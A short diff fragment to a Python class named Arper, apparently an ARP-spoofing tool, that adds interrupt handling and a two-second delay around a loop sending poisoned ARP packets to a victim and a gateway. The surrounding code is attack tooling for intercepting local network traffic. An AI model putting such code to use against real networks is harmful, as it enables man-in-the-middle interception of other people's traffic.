@@ -65,4 +65,9 @@ class Arper():
             try:
                 send(poison_victim)
                 send(poison_gateway)
+            except KeyboardInterrupt:
+                self.restore()
+                sys.exit()
+            else:
+                time.sleep(2)
 
